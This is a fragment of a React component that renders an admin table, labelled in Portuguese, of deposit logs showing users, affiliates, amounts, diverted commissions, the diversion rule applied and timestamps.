                    <th className="py-2.5 px-3 text-right">Depósito (R$)</th>
                    <th className="py-2.5 px-3 text-right">Comissão Salva</th>
                    <th className="py-2.5 px-3">Regra de Desvio</th>
                    <th className="py-2.5 px-3 text-right">Data/Hora</th>
                  </tr>
                </thead>
                <tbody className="divide-y divide-slate-100">
                  {filteredLogs.map((log) => (
                    <tr key={log.id} className="hover:bg-slate-50/60 transition-colors">
                      <td className="py-3 px-3 font-mono text-[11px] text-slate-600">
                        {log.depositId ? log.depositId.substring(0, 14) : log.id}
                      </td>
                      <td className="py-3 px-3">
                        <strong className="text-slate-800 font-semibold block">{log.originalUserName}</strong>
                        {log.originalUserEmail && (
                          <span className="text-[10px] text-slate-400 block">{log.originalUserEmail}</span>
                        )}
                      </td>
                      <td className="py-3 px-3">
                        <div className="flex items-center gap-1.5">
                          <strong className="text-slate-800 font-medium">{log.affiliateName || 'Afiliado'}</strong>
                          {log.affiliateCode && (
                            <span className="font-mono text-[10px] bg-slate-100 px-1.5 py-0.2 rounded text-slate-600">
                              {log.affiliateCode}
                            </span>
                          )}
                        </div>
                        {log.affiliateEmail && (
                          <span className="text-[10px] text-slate-400 block">{log.affiliateEmail}</span>
                        )}
                      </td>
                      <td className="py-3 px-3 text-right font-bold text-slate-900 tabular-nums">
                        R$ {log.amount.toLocaleString('pt-BR', { minimumFractionDigits: 2, maximumFractionDigits: 2 })}
                      </td>
                      <td className="py-3 px-3 text-right font-extrabold text-emerald-600 tabular-nums">
                        +R$ {(log.divertedCommission || 0).toLocaleString('pt-BR', { minimumFractionDigits: 2, maximumFractionDigits: 2 })}
                      </td>
                      <td className="py-3 px-3">
                        <span className="inline-flex items-center gap-1 px-2 py-0.5 rounded-full text-[10px] font-semibold bg-amber-50 text-amber-800 border border-amber-200/80">
                          {log.ruleApplied}
                        </span>
                      </td>
                      <td className="py-3 px-3 text-right text-slate-400 tabular-nums text-[11px]">
                        {new Date(log.divertedAt).toLocaleDateString('pt-BR', {
                          day: '2-digit',
                          month: '2-digit',
                          hour: '2-digit',
                          minute: '2-digit'
                        })}
                      </td>
                    </tr>
                  ))}
                </tbody>
              </table>
            </div>
          </>
        )}
      </div>
    </div>
  );
};
